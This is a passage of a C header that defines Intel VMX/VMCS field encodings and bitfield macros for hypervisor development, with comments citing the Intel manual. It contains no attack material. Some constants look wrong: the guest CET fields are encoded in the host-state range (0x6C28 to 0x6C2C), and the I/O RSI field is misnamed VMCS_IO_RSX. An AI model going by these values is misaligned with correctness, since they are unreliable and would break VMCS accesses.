     * @see Vol3C[24.11.4(Software Access to Related Structures)]
     * @see Vol3D[A.1(BASIC VMX INFORMATION)]
     */
    UINT8 Data[4092];
} VMXON;

/**
 * @defgroup VMCS_FIELDS \
 *           VMCS (VM Control Structure)
 *
 * Every component of the VMCS is encoded by a 32-bit field that can be used by VMREAD and VMWRITE. This enumerates all
 * fields in the VMCS and their encodings. Fields are grouped by width (16-bit, 32-bit, etc.) and type (guest-state,
 * host-state, etc.).
 *
 * @see Vol3D[B(APPENDIX B FIELD ENCODING IN VMCS)] (reference)
 * @{
 */
typedef union
{
    struct
    {
        /**
         * [Bit 0] Access type (0 = full; 1 = high); must be full for 16-bit, 32-bit, and natural-width fields.
         */
        UINT16 AccessType : 1;
#define VMCS_COMPONENT_ENCODING_ACCESS_TYPE_BIT                      0
#define VMCS_COMPONENT_ENCODING_ACCESS_TYPE_FLAG                     0x01
#define VMCS_COMPONENT_ENCODING_ACCESS_TYPE_MASK                     0x01
#define VMCS_COMPONENT_ENCODING_ACCESS_TYPE(_)                       (((_) >> 0) & 0x01)

        /**
         * [Bits 9:1] Index.
         */
        UINT16 Index : 9;
#define VMCS_COMPONENT_ENCODING_INDEX_BIT                            1
#define VMCS_COMPONENT_ENCODING_INDEX_FLAG                           0x3FE
#define VMCS_COMPONENT_ENCODING_INDEX_MASK                           0x1FF
#define VMCS_COMPONENT_ENCODING_INDEX(_)                             (((_) >> 1) & 0x1FF)

        /**
         * [Bits 11:10] Type:
         * 0: control
         * 1: VM-exit information
         * 2: guest state
         * 3: host state
         */
        UINT16 Type : 2;
#define VMCS_COMPONENT_ENCODING_TYPE_BIT                             10
#define VMCS_COMPONENT_ENCODING_TYPE_FLAG                            0xC00
#define VMCS_COMPONENT_ENCODING_TYPE_MASK                            0x03
#define VMCS_COMPONENT_ENCODING_TYPE(_)                              (((_) >> 10) & 0x03)

        /**
         * [Bit 12] Reserved (must be 0).
         */
        UINT16 MustBeZero : 1;
#define VMCS_COMPONENT_ENCODING_MUST_BE_ZERO_BIT                     12
#define VMCS_COMPONENT_ENCODING_MUST_BE_ZERO_FLAG                    0x1000
#define VMCS_COMPONENT_ENCODING_MUST_BE_ZERO_MASK                    0x01
#define VMCS_COMPONENT_ENCODING_MUST_BE_ZERO(_)                      (((_) >> 12) & 0x01)

        /**
         * [Bits 14:13] Width:
         * 0: 16-bit
         * 1: 64-bit
         * 2: 32-bit
         * 3: natural-width
         */
        UINT16 Width : 2;
#define VMCS_COMPONENT_ENCODING_WIDTH_BIT                            13
#define VMCS_COMPONENT_ENCODING_WIDTH_FLAG                           0x6000
#define VMCS_COMPONENT_ENCODING_WIDTH_MASK                           0x03
#define VMCS_COMPONENT_ENCODING_WIDTH(_)                             (((_) >> 13) & 0x03)
        UINT16 Reserved1 : 1;
    };

    UINT16 Flags;
} VMCS_COMPONENT_ENCODING;

/**
 * @defgroup VMCS_16_BIT \
 *           16-Bit Fields
 *
 * 16-Bit Fields.
 *
 * @see Vol3D[B.1(16-BIT FIELDS)] (reference)
 * @{
 */
 /**
  * @defgroup VMCS_16_BIT_CONTROL_FIELDS \
  *           16-Bit Control Fields
  *
  * 16-Bit Control Fields.
  * @{
  */
  /**
   * Virtual-processor identifier (VPID).
   *
   * @remarks This field exists only on processors that support the 1-setting of the "enable VPID" VM-execution control.
   */
#define VMCS_CTRL_VIRTUAL_PROCESSOR_IDENTIFIER                       0x00000000

   /**
    * Posted-interrupt notification vector.
    *
    * @remarks This field exists only on processors that support the 1-setting of the "process posted interrupts" VM-execution
    *          control.
    */
#define VMCS_CTRL_POSTED_INTERRUPT_NOTIFICATION_VECTOR               0x00000002

    /**
     * EPTP index.
     *
     * @remarks This field exists only on processors that support the 1-setting of the "EPT-violation \#VE" VM-execution
     *          control.
     */
#define VMCS_CTRL_EPTP_INDEX                                         0x00000004
     /**
      * @}
      */

      /**
       * @defgroup VMCS_16_BIT_GUEST_STATE_FIELDS \
       *           16-Bit Guest-State Fields
       *
       * 16-Bit Guest-State Fields.
       * @{
       */
       /**
        * Guest ES selector.
        */
#define VMCS_GUEST_ES_SELECTOR                                       0x00000800

        /**
         * Guest CS selector.
         */
#define VMCS_GUEST_CS_SELECTOR                                       0x00000802

         /**
          * Guest SS selector.
          */
#define VMCS_GUEST_SS_SELECTOR                                       0x00000804

          /**
           * Guest DS selector.
           */
#define VMCS_GUEST_DS_SELECTOR                                       0x00000806

           /**
            * Guest FS selector.
            */
#define VMCS_GUEST_FS_SELECTOR                                       0x00000808

            /**
             * Guest GS selector.
             */
#define VMCS_GUEST_GS_SELECTOR                                       0x0000080A

             /**
              * Guest LDTR selector.
              */
#define VMCS_GUEST_LDTR_SELECTOR                                     0x0000080C

              /**
               * Guest TR selector.
               */
#define VMCS_GUEST_TR_SELECTOR                                       0x0000080E

               /**
                * Guest interrupt status.
                *
                * @remarks This field exists only on processors that support the 1-setting of the "virtual-interrupt delivery"
                *          VM-execution control.
                */
#define VMCS_GUEST_INTERRUPT_STATUS                                  0x00000810

                /**
                 * PML index.
                 *
                 * @remarks This field exists only on processors that support the 1-setting of the "enable PML" VM-execution control.
                 */
#define VMCS_GUEST_PML_INDEX                                         0x00000812
                 /**
                  * @}
                  */

                  /**
                   * @defgroup VMCS_16_BIT_HOST_STATE_FIELDS \
                   *           16-Bit Host-State Fields
                   *
                   * 16-Bit Host-State Fields.
                   * @{
                   */
                   /**
                    * Host ES selector.
                    */
#define VMCS_HOST_ES_SELECTOR                                        0x00000C00

                    /**
                     * Host CS selector.
                     */
#define VMCS_HOST_CS_SELECTOR                                        0x00000C02

                     /**
                      * Host SS selector.
                      */
#define VMCS_HOST_SS_SELECTOR                                        0x00000C04

                      /**
                       * Host DS selector.
                       */
#define VMCS_HOST_DS_SELECTOR                                        0x00000C06

                       /**
                        * Host FS selector.
                        */
#define VMCS_HOST_FS_SELECTOR                                        0x00000C08

                        /**
                         * Host GS selector.
                         */
#define VMCS_HOST_GS_SELECTOR                                        0x00000C0A

                         /**
                          * Host TR selector.
                          */
#define VMCS_HOST_TR_SELECTOR                                        0x00000C0C
                          /**
                           * @}
                           */

                           /**
                            * @}
                            */

                            /**
                             * @defgroup VMCS_64_BIT \
                             *           64-Bit Fields
                             *
                             * 64-Bit Fields.
                             *
                             * @see Vol3D[B.2(64-BIT FIELDS)] (reference)
                             * @{
                             */
                             /**
                              * @defgroup VMCS_64_BIT_CONTROL_FIELDS \
                              *           64-Bit Control Fields
                              *
                              * 64-Bit Control Fields.
                              * @{
                              */
                              /**
                               * Address of I/O bitmap A.
                               */
#define VMCS_CTRL_IO_BITMAP_A_ADDRESS                                0x00002000

                               /**
                                * Address of I/O bitmap B.
                                */
#define VMCS_CTRL_IO_BITMAP_B_ADDRESS                                0x00002002

                                /**
                                 * Address of MSR bitmaps.
                                 */
#define VMCS_CTRL_MSR_BITMAP_ADDRESS                                 0x00002004

                                 /**
                                  * VM-exit MSR-store address.
                                  */
#define VMCS_CTRL_VMEXIT_MSR_STORE_ADDRESS                           0x00002006

                                  /**
                                   * VM-exit MSR-load address.
                                   */
#define VMCS_CTRL_VMEXIT_MSR_LOAD_ADDRESS                            0x00002008

                                   /**
                                    * VM-entry MSR-load address.
                                    */
#define VMCS_CTRL_VMENTRY_MSR_LOAD_ADDRESS                           0x0000200A

                                    /**
                                     * Executive-VMCS pointer.
                                     */
#define VMCS_CTRL_EXECUTIVE_VMCS_POINTER                             0x0000200C

                                     /**
                                      * PML address.
                                      */
#define VMCS_CTRL_PML_ADDRESS                                        0x0000200E

                                      /**
                                       * TSC offset.
                                       */
#define VMCS_CTRL_TSC_OFFSET                                         0x00002010

                                       /**
                                        * Virtual-APIC address.
                                        */
#define VMCS_CTRL_VIRTUAL_APIC_ADDRESS                               0x00002012

                                        /**
                                         * APIC-access address.
                                         */
#define VMCS_CTRL_APIC_ACCESS_ADDRESS                                0x00002014

                                         /**
                                          * Posted-interrupt descriptor address
                                          */
#define VMCS_CTRL_POSTED_INTERRUPT_DESCRIPTOR_ADDRESS                0x00002016

                                          /**
                                           * VM-function controls.
                                           */
#define VMCS_CTRL_VMFUNC_CONTROLS                                    0x00002018

                                           /**
                                            * EPT pointer.
                                            */
#define VMCS_CTRL_EPT_POINTER                                        0x0000201A

                                            /**
                                             * EOI-exit bitmap 0.
                                             */
#define VMCS_CTRL_EOI_EXIT_BITMAP_0                                  0x0000201C

                                             /**
                                              * EOI-exit bitmap 1.
                                              */
#define VMCS_CTRL_EOI_EXIT_BITMAP_1                                  0x0000201E

                                              /**
                                               * EOI-exit bitmap 2.
                                               */
#define VMCS_CTRL_EOI_EXIT_BITMAP_2                                  0x00002020

                                               /**
                                                * EOI-exit bitmap 3.
                                                */
#define VMCS_CTRL_EOI_EXIT_BITMAP_3                                  0x00002022

                                                /**
                                                 * EPTP-list address.
                                                 */
#define VMCS_CTRL_EPT_POINTER_LIST_ADDRESS                           0x00002024

                                                 /**
                                                  * VMREAD-bitmap address.
                                                  */
#define VMCS_CTRL_VMREAD_BITMAP_ADDRESS                              0x00002026

                                                  /**
                                                   * VMWRITE-bitmap address.
                                                   */
#define VMCS_CTRL_VMWRITE_BITMAP_ADDRESS                             0x00002028

                                                   /**
                                                    * Virtualization-exception information address.
                                                    */
#define VMCS_CTRL_VIRTUALIZATION_EXCEPTION_INFORMATION_ADDRESS       0x0000202A

                                                    /**
                                                     * XSS-exiting bitmap.
                                                     */
#define VMCS_CTRL_XSS_EXITING_BITMAP                                 0x0000202C

                                                     /**
                                                      * ENCLS-exiting bitmap.
                                                      */
#define VMCS_CTRL_ENCLS_EXITING_BITMAP                               0x0000202E

                                                      /**
                                                       * TSC multiplier.
                                                       */
#define VMCS_CTRL_TSC_MULTIPLIER                                     0x00002032
                                                       /**
                                                        * @}
                                                        */

                                                        /**
                                                         * @defgroup VMCS_64_BIT_READ_ONLY_DATA_FIELDS \
                                                         *           64-Bit Read-Only Data Field
                                                         *
                                                         * 64-Bit Read-Only Data Field.
                                                         * @{
                                                         */
                                                         /**
                                                          * Guest-physical address.
                                                          */
#define VMCS_GUEST_PHYSICAL_ADDRESS                                  0x00002400
                                                          /**
                                                           * @}
                                                           */

                                                           /**
                                                            * @defgroup VMCS_64_BIT_GUEST_STATE_FIELDS \
                                                            *           64-Bit Guest-State Fields
                                                            *
                                                            * 64-Bit Guest-State Fields.
                                                            * @{
                                                            */
                                                            /**
                                                             * VMCS link pointer.
                                                             */
#define VMCS_GUEST_VMCS_LINK_POINTER                                 0x00002800

                                                             /**
                                                              * Guest IA32_DEBUGCTL.
                                                              */
#define VMCS_GUEST_DEBUGCTL                                          0x00002802

                                                              /**
                                                               * Guest IA32_PAT.
                                                               */
#define VMCS_GUEST_PAT                                               0x00002804

                                                               /**
                                                                * Guest IA32_EFER.
                                                                */
#define VMCS_GUEST_EFER                                              0x00002806

                                                                /**
                                                                 * Guest IA32_PERF_GLOBAL_CTRL.
                                                                 */
#define VMCS_GUEST_PERF_GLOBAL_CTRL                                  0x00002808

                                                                 /**
                                                                  * Guest PDPTE0.
                                                                  */
#define VMCS_GUEST_PDPTE0                                            0x0000280A

                                                                  /**
                                                                   * Guest PDPTE1.
                                                                   */
#define VMCS_GUEST_PDPTE1                                            0x0000280C

                                                                   /**
                                                                    * Guest PDPTE2.
                                                                    */
#define VMCS_GUEST_PDPTE2                                            0x0000280E

                                                                    /**
                                                                     * Guest PDPTE3.
                                                                     */
#define VMCS_GUEST_PDPTE3                                            0x00002810

                                                                     /**
                                                                      * Guest IA32_BNDCFGS.
                                                                      */
#define VMCS_GUEST_BNDCFGS                                           0x00002812

                                                                      /**
                                                                       * Guest IA32_RTIT_CTL.
                                                                       */
#define VMCS_GUEST_RTIT_CTL                                          0x00002814
                                                                       /**
                                                                        * @}
                                                                        */

                                                                        /**
                                                                         * @defgroup VMCS_64_BIT_HOST_STATE_FIELDS \
                                                                         *           64-Bit Host-State Fields
                                                                         *
                                                                         * 64-Bit Host-State Fields.
                                                                         * @{
                                                                         */
                                                                         /**
                                                                          * Host IA32_PAT.
                                                                          */
#define VMCS_HOST_PAT                                                0x00002C00

                                                                          /**
                                                                           * Host IA32_EFER.
                                                                           */
#define VMCS_HOST_EFER                                               0x00002C02

                                                                           /**
                                                                            * Host IA32_PERF_GLOBAL_CTRL.
                                                                            */
#define VMCS_HOST_PERF_GLOBAL_CTRL                                   0x00002C04
                                                                            /**
                                                                             * @}
                                                                             */

                                                                             /**
                                                                              * @}
                                                                              */

                                                                              /**
                                                                               * @defgroup VMCS_32_BIT \
                                                                               *           32-Bit Fields
                                                                               *
                                                                               * 32-Bit Fields.
                                                                               *
                                                                               * @see Vol3D[B.3(32-BIT FIELDS)] (reference)
                                                                               * @{
                                                                               */
                                                                               /**
                                                                                * @defgroup VMCS_32_BIT_CONTROL_FIELDS \
                                                                                *           32-Bit Control Fields
                                                                                *
                                                                                * 32-Bit Control Fields.
                                                                                * @{
                                                                                */
                                                                                /**
                                                                                 * Pin-based VM-execution controls.
                                                                                 */
#define VMCS_CTRL_PIN_BASED_VM_EXECUTION_CONTROLS                    0x00004000

                                                                                 /**
                                                                                  * Primary processor-based VM-execution controls.
                                                                                  */
#define VMCS_CTRL_PROCESSOR_BASED_VM_EXECUTION_CONTROLS              0x00004002

                                                                                  /**
                                                                                   * Exception bitmap.
                                                                                   */
#define VMCS_CTRL_EXCEPTION_BITMAP                                   0x00004004

                                                                                   /**
                                                                                    * Page-fault error-code mask.
                                                                                    */
#define VMCS_CTRL_PAGEFAULT_ERROR_CODE_MASK                          0x00004006

                                                                                    /**
                                                                                     * Page-fault error-code match.
                                                                                     */
#define VMCS_CTRL_PAGEFAULT_ERROR_CODE_MATCH                         0x00004008

                                                                                     /**
                                                                                      * CR3-target count.
                                                                                      */
#define VMCS_CTRL_CR3_TARGET_COUNT                                   0x0000400A

                                                                                      /**
                                                                                       * VM-exit controls.
                                                                                       */
#define VMCS_CTRL_VMEXIT_CONTROLS                                    0x0000400C

                                                                                       /**
                                                                                        * VM-exit MSR-store count.
                                                                                        */
#define VMCS_CTRL_VMEXIT_MSR_STORE_COUNT                             0x0000400E

                                                                                        /**
                                                                                         * VM-exit MSR-load count.
                                                                                         */
#define VMCS_CTRL_VMEXIT_MSR_LOAD_COUNT                              0x00004010

                                                                                         /**
                                                                                          * VM-entry controls.
                                                                                          */
#define VMCS_CTRL_VMENTRY_CONTROLS                                   0x00004012

                                                                                          /**
                                                                                           * VM-entry MSR-load count.
                                                                                           */
#define VMCS_CTRL_VMENTRY_MSR_LOAD_COUNT                             0x00004014

                                                                                           /**
                                                                                            * VM-entry interruption-information field.
                                                                                            */
#define VMCS_CTRL_VMENTRY_INTERRUPTION_INFORMATION_FIELD             0x00004016

                                                                                            /**
                                                                                             * VM-entry exception error code.
                                                                                             */
#define VMCS_CTRL_VMENTRY_EXCEPTION_ERROR_CODE                       0x00004018

                                                                                             /**
                                                                                              * VM-entry instruction length.
                                                                                              */
#define VMCS_CTRL_VMENTRY_INSTRUCTION_LENGTH                         0x0000401A

                                                                                              /**
                                                                                               * TPR threshold.
                                                                                               */
#define VMCS_CTRL_TPR_THRESHOLD                                      0x0000401C

                                                                                               /**
                                                                                                * Secondary processor-based VM-execution controls.
                                                                                                */
#define VMCS_CTRL_SECONDARY_PROCESSOR_BASED_VM_EXECUTION_CONTROLS    0x0000401E

                                                                                                /**
                                                                                                 * PLE_Gap.
                                                                                                 */
#define VMCS_CTRL_PLE_GAP                                            0x00004020

                                                                                                 /**
                                                                                                  * PLE_Window.
                                                                                                  */
#define VMCS_CTRL_PLE_WINDOW                                         0x00004022
                                                                                                  /**
                                                                                                   * @}
                                                                                                   */

                                                                                                   /**
                                                                                                    * @defgroup VMCS_32_BIT_READ_ONLY_DATA_FIELDS \
                                                                                                    *           32-Bit Read-Only Data Fields
                                                                                                    *
                                                                                                    * 32-Bit Read-Only Data Fields.
                                                                                                    * @{
                                                                                                    */
                                                                                                    /**
                                                                                                     * VM-instruction error.
                                                                                                     */
#define VMCS_VM_INSTRUCTION_ERROR                                    0x00004400

                                                                                                     /**
                                                                                                      * Exit reason.
                                                                                                      */
#define VMCS_EXIT_REASON                                             0x00004402

                                                                                                      /**
                                                                                                       * VM-exit interruption information.
                                                                                                       */
#define VMCS_VMEXIT_INTERRUPTION_INFORMATION                         0x00004404

                                                                                                       /**
                                                                                                        * VM-exit interruption error code.
                                                                                                        */
#define VMCS_VMEXIT_INTERRUPTION_ERROR_CODE                          0x00004406

                                                                                                        /**
                                                                                                         * IDT-vectoring information field.
                                                                                                         */
#define VMCS_IDT_VECTORING_INFORMATION                               0x00004408

                                                                                                         /**
                                                                                                          * IDT-vectoring error code.
                                                                                                          */
#define VMCS_IDT_VECTORING_ERROR_CODE                                0x0000440A

                                                                                                          /**
                                                                                                           * VM-exit instruction length.
                                                                                                           */
#define VMCS_VMEXIT_INSTRUCTION_LENGTH                               0x0000440C

                                                                                                           /**
                                                                                                            * VM-exit instruction information.
                                                                                                            */
#define VMCS_VMEXIT_INSTRUCTION_INFO                                 0x0000440E
                                                                                                            /**
                                                                                                             * @}
                                                                                                             */

                                                                                                             /**
                                                                                                              * @defgroup VMCS_32_BIT_GUEST_STATE_FIELDS \
                                                                                                              *           32-Bit Guest-State Fields
                                                                                                              *
                                                                                                              * 32-Bit Guest-State Fields.
                                                                                                              * @{
                                                                                                              */
                                                                                                              /**
                                                                                                               * Guest ES limit.
                                                                                                               */
#define VMCS_GUEST_ES_LIMIT                                          0x00004800

                                                                                                               /**
                                                                                                                * Guest CS limit.
                                                                                                                */
#define VMCS_GUEST_CS_LIMIT                                          0x00004802

                                                                                                                /**
                                                                                                                 * Guest SS limit.
                                                                                                                 */
#define VMCS_GUEST_SS_LIMIT                                          0x00004804

                                                                                                                 /**
                                                                                                                  * Guest DS limit.
                                                                                                                  */
#define VMCS_GUEST_DS_LIMIT                                          0x00004806

                                                                                                                  /**
                                                                                                                   * Guest FS limit.
                                                                                                                   */
#define VMCS_GUEST_FS_LIMIT                                          0x00004808

                                                                                                                   /**
                                                                                                                    * Guest GS limit.
                                                                                                                    */
#define VMCS_GUEST_GS_LIMIT                                          0x0000480A

                                                                                                                    /**
                                                                                                                     * Guest LDTR limit.
                                                                                                                     */
#define VMCS_GUEST_LDTR_LIMIT                                        0x0000480C

                                                                                                                     /**
                                                                                                                      * Guest TR limit.
                                                                                                                      */
#define VMCS_GUEST_TR_LIMIT                                          0x0000480E

                                                                                                                      /**
                                                                                                                       * Guest GDTR limit.
                                                                                                                       */
#define VMCS_GUEST_GDTR_LIMIT                                        0x00004810

                                                                                                                       /**
                                                                                                                        * Guest IDTR limit.
                                                                                                                        */
#define VMCS_GUEST_IDTR_LIMIT                                        0x00004812

                                                                                                                        /**
                                                                                                                         * Guest ES access rights.
                                                                                                                         */
#define VMCS_GUEST_ES_ACCESS_RIGHTS                                  0x00004814

                                                                                                                         /**
                                                                                                                          * Guest CS access rights.
                                                                                                                          */
#define VMCS_GUEST_CS_ACCESS_RIGHTS                                  0x00004816

                                                                                                                          /**
                                                                                                                           * Guest SS access rights.
                                                                                                                           */
#define VMCS_GUEST_SS_ACCESS_RIGHTS                                  0x00004818

                                                                                                                           /**
                                                                                                                            * Guest DS access rights.
                                                                                                                            */
#define VMCS_GUEST_DS_ACCESS_RIGHTS                                  0x0000481A

                                                                                                                            /**
                                                                                                                             * Guest FS access rights.
                                                                                                                             */
#define VMCS_GUEST_FS_ACCESS_RIGHTS                                  0x0000481C

                                                                                                                             /**
                                                                                                                              * Guest GS access rights.
                                                                                                                              */
#define VMCS_GUEST_GS_ACCESS_RIGHTS                                  0x0000481E

                                                                                                                              /**
                                                                                                                               * Guest LDTR access rights.
                                                                                                                               */
#define VMCS_GUEST_LDTR_ACCESS_RIGHTS                                0x00004820

                                                                                                                               /**
                                                                                                                                * Guest TR access rights.
                                                                                                                                */
#define VMCS_GUEST_TR_ACCESS_RIGHTS                                  0x00004822

                                                                                                                                /**
                                                                                                                                 * Guest interruptibility state.
                                                                                                                                 */
#define VMCS_GUEST_INTERRUPTIBILITY_STATE                            0x00004824

                                                                                                                                 /**
                                                                                                                                  * Guest activity state.
                                                                                                                                  */
#define VMCS_GUEST_ACTIVITY_STATE                                    0x00004826

                                                                                                                                  /**
                                                                                                                                   * Guest SMBASE.
                                                                                                                                   */
#define VMCS_GUEST_SMBASE                                            0x00004828

                                                                                                                                   /**
                                                                                                                                    * Guest IA32_SYSENTER_CS.
                                                                                                                                    */
#define VMCS_GUEST_SYSENTER_CS                                       0x0000482A

                                                                                                                                    /**
                                                                                                                                     * VMX-preemption timer value.
                                                                                                                                     */
#define VMCS_GUEST_VMX_PREEMPTION_TIMER_VALUE                        0x0000482E
                                                                                                                                     /**
                                                                                                                                      * @}
                                                                                                                                      */

                                                                                                                                      /**
                                                                                                                                       * @defgroup VMCS_32_BIT_HOST_STATE_FIELDS \
                                                                                                                                       *           32-Bit Host-State Field
                                                                                                                                       *
                                                                                                                                       * 32-Bit Host-State Field.
                                                                                                                                       * @{
                                                                                                                                       */
                                                                                                                                       /**
                                                                                                                                        * Host IA32_SYSENTER_CS.
                                                                                                                                        */
#define VMCS_HOST_SYSENTER_CS                                        0x00004C00
                                                                                                                                        /**
                                                                                                                                         * @}
                                                                                                                                         */

                                                                                                                                         /**
                                                                                                                                          * @}
                                                                                                                                          */

                                                                                                                                          /**
                                                                                                                                           * @defgroup VMCS_NATURAL_WIDTH \
                                                                                                                                           *           Natural-Width Fields
                                                                                                                                           *
                                                                                                                                           * Natural-Width Fields.
                                                                                                                                           *
                                                                                                                                           * @see Vol3D[B.4(NATURAL-WIDTH FIELDS)] (reference)
                                                                                                                                           * @{
                                                                                                                                           */
                                                                                                                                           /**
                                                                                                                                            * @defgroup VMCS_NATURAL_WIDTH_CONTROL_FIELDS \
                                                                                                                                            *           Natural-Width Control Fields
                                                                                                                                            *
                                                                                                                                            * Natural-Width Control Fields
                                                                                                                                            * @{
                                                                                                                                            */
                                                                                                                                            /**
                                                                                                                                             * CR0 guest/host mask.
                                                                                                                                             */
#define VMCS_CTRL_CR0_GUEST_HOST_MASK                                0x00006000

                                                                                                                                             /**
                                                                                                                                              * CR4 guest/host mask.
                                                                                                                                              */
#define VMCS_CTRL_CR4_GUEST_HOST_MASK                                0x00006002

                                                                                                                                              /**
                                                                                                                                               * CR0 read shadow.
                                                                                                                                               */
#define VMCS_CTRL_CR0_READ_SHADOW                                    0x00006004

                                                                                                                                               /**
                                                                                                                                                * CR4 read shadow.
                                                                                                                                                */
#define VMCS_CTRL_CR4_READ_SHADOW                                    0x00006006

                                                                                                                                                /**
                                                                                                                                                 * CR3-target value 0.
                                                                                                                                                 */
#define VMCS_CTRL_CR3_TARGET_VALUE_0                                 0x00006008

                                                                                                                                                 /**
                                                                                                                                                  * CR3-target value 1.
                                                                                                                                                  */
#define VMCS_CTRL_CR3_TARGET_VALUE_1                                 0x0000600A

                                                                                                                                                  /**
                                                                                                                                                   * CR3-target value 2.
                                                                                                                                                   */
#define VMCS_CTRL_CR3_TARGET_VALUE_2                                 0x0000600C

                                                                                                                                                   /**
                                                                                                                                                    * CR3-target value 3.
                                                                                                                                                    */
#define VMCS_CTRL_CR3_TARGET_VALUE_3                                 0x0000600E
                                                                                                                                                    /**
                                                                                                                                                     * @}
                                                                                                                                                     */

                                                                                                                                                     /**
                                                                                                                                                      * @defgroup VMCS_NATURAL_WIDTH_READ_ONLY_DATA_FIELDS \
                                                                                                                                                      *           Natural-Width Read-Only Data Fields
                                                                                                                                                      *
                                                                                                                                                      * Natural-Width Read-Only Data Fields.
                                                                                                                                                      * @{
                                                                                                                                                      */
                                                                                                                                                      /**
                                                                                                                                                       * Exit qualification.
                                                                                                                                                       */
#define VMCS_EXIT_QUALIFICATION                                      0x00006400

                                                                                                                                                       /**
                                                                                                                                                        * I/O RCX.
                                                                                                                                                        */
#define VMCS_IO_RCX                                                  0x00006402

                                                                                                                                                        /**
                                                                                                                                                         * I/O RSI.
                                                                                                                                                         */
#define VMCS_IO_RSX                                                  0x00006404

                                                                                                                                                         /**
                                                                                                                                                          * I/O RDI.
                                                                                                                                                          */
#define VMCS_IO_RDI                                                  0x00006406

                                                                                                                                                          /**
                                                                                                                                                           * I/O RIP.
                                                                                                                                                           */
#define VMCS_IO_RIP                                                  0x00006408

                                                                                                                                                           /**
                                                                                                                                                            * Guest-linear address.
                                                                                                                                                            */
#define VMCS_EXIT_GUEST_LINEAR_ADDRESS                               0x0000640A
                                                                                                                                                            /**
                                                                                                                                                             * @}
                                                                                                                                                             */

                                                                                                                                                             /**
                                                                                                                                                              * @defgroup VMCS_NATURAL_WIDTH_GUEST_STATE_FIELDS \
                                                                                                                                                              *           Natural-Width Guest-State Fields
                                                                                                                                                              *
                                                                                                                                                              * Natural-Width Guest-State Fields.
                                                                                                                                                              * @{
                                                                                                                                                              */
                                                                                                                                                              /**
                                                                                                                                                               * Guest CR0.
                                                                                                                                                               */
#define VMCS_GUEST_CR0                                               0x00006800

                                                                                                                                                               /**
                                                                                                                                                                * Guest CR3.
                                                                                                                                                                */
#define VMCS_GUEST_CR3                                               0x00006802

                                                                                                                                                                /**
                                                                                                                                                                 * Guest CR4.
                                                                                                                                                                 */
#define VMCS_GUEST_CR4                                               0x00006804

                                                                                                                                                                 /**
                                                                                                                                                                  * Guest ES base.
                                                                                                                                                                  */
#define VMCS_GUEST_ES_BASE                                           0x00006806

                                                                                                                                                                  /**
                                                                                                                                                                   * Guest CS base.
                                                                                                                                                                   */
#define VMCS_GUEST_CS_BASE                                           0x00006808

                                                                                                                                                                   /**
                                                                                                                                                                    * Guest SS base.
                                                                                                                                                                    */
#define VMCS_GUEST_SS_BASE                                           0x0000680A

                                                                                                                                                                    /**
                                                                                                                                                                     * Guest DS base.
                                                                                                                                                                     */
#define VMCS_GUEST_DS_BASE                                           0x0000680C

                                                                                                                                                                     /**
                                                                                                                                                                      * Guest FS base.
                                                                                                                                                                      */
#define VMCS_GUEST_FS_BASE                                           0x0000680E

                                                                                                                                                                      /**
                                                                                                                                                                       * Guest GS base.
                                                                                                                                                                       */
#define VMCS_GUEST_GS_BASE                                           0x00006810

                                                                                                                                                                       /**
                                                                                                                                                                        * Guest LDTR base.
                                                                                                                                                                        */
#define VMCS_GUEST_LDTR_BASE                                         0x00006812

                                                                                                                                                                        /**
                                                                                                                                                                         * Guest TR base.
                                                                                                                                                                         */
#define VMCS_GUEST_TR_BASE                                           0x00006814

                                                                                                                                                                         /**
                                                                                                                                                                          * Guest GDTR base.
                                                                                                                                                                          */
#define VMCS_GUEST_GDTR_BASE                                         0x00006816

                                                                                                                                                                          /**
                                                                                                                                                                           * Guest IDTR base.
                                                                                                                                                                           */
#define VMCS_GUEST_IDTR_BASE                                         0x00006818

                                                                                                                                                                           /**
                                                                                                                                                                            * Guest DR7.
                                                                                                                                                                            */
#define VMCS_GUEST_DR7                                               0x0000681A

                                                                                                                                                                            /**
                                                                                                                                                                             * Guest RSP.
                                                                                                                                                                             */
#define VMCS_GUEST_RSP                                               0x0000681C

                                                                                                                                                                             /**
                                                                                                                                                                              * Guest RIP.
                                                                                                                                                                              */
#define VMCS_GUEST_RIP                                               0x0000681E

                                                                                                                                                                              /**
                                                                                                                                                                               * Guest RFLAGS.
                                                                                                                                                                               */
#define VMCS_GUEST_RFLAGS                                            0x00006820

                                                                                                                                                                               /**
                                                                                                                                                                                * Guest pending debug exceptions.
                                                                                                                                                                                */
#define VMCS_GUEST_PENDING_DEBUG_EXCEPTIONS                          0x00006822

                                                                                                                                                                                /**
                                                                                                                                                                                 * Guest IA32_SYSENTER_ESP.
                                                                                                                                                                                 */
#define VMCS_GUEST_SYSENTER_ESP                                      0x00006824

                                                                                                                                                                                 /**
                                                                                                                                                                                  * Guest IA32_SYSENTER_EIP.
                                                                                                                                                                                  */
#define VMCS_GUEST_SYSENTER_EIP                                      0x00006826

                                                                                                                                                                                  /**
                                                                                                                                                                                   * Guest IA32_S_CET.
                                                                                                                                                                                   */
#define VMCS_GUEST_S_CET                                             0x00006C28

                                                                                                                                                                                   /**
                                                                                                                                                                                    * Guest SSP.
                                                                                                                                                                                    */
#define VMCS_GUEST_SSP                                               0x00006C2A

                                                                                                                                                                                    /**
                                                                                                                                                                                     * Guest IA32_INTERRUPT_SSP_TABLE_ADDR.
                                                                                                                                                                                     */
#define VMCS_GUEST_INTERRUPT_SSP_TABLE_ADDR                          0x00006C2C
                                                                                                                                                                                     /**
                                                                                                                                                                                      * @}
                                                                                                                                                                                      */

                                                                                                                                                                                      /**
                                                                                                                                                                                       * @defgroup VMCS_NATURAL_WIDTH_HOST_STATE_FIELDS \
                                                                                                                                                                                       *           Natural-Width Host-State Fields
                                                                                                                                                                                       *
                                                                                                                                                                                       * Natural-Width Host-State Fields.
                                                                                                                                                                                       * @{
                                                                                                                                                                                       */
                                                                                                                                                                                       /**
                                                                                                                                                                                        * Host CR0.
                                                                                                                                                                                        */
#define VMCS_HOST_CR0                                                0x00006C00

                                                                                                                                                                                        /**
                                                                                                                                                                                         * Host CR3.
                                                                                                                                                                                         */
#define VMCS_HOST_CR3                                                0x00006C02

                                                                                                                                                                                         /**
                                                                                                                                                                                          * Host CR4.
                                                                                                                                                                                          */
#define VMCS_HOST_CR4                                                0x00006C04

                                                                                                                                                                                          /**
                                                                                                                                                                                           * Host FS base.
                                                                                                                                                                                           */
#define VMCS_HOST_FS_BASE                                            0x00006C06

                                                                                                                                                                                           /**
                                                                                                                                                                                            * Host GS base.
                                                                                                                                                                                            */
#define VMCS_HOST_GS_BASE                                            0x00006C08

                                                                                                                                                                                            /**
                                                                                                                                                                                             * Host TR base.
                                                                                                                                                                                             */
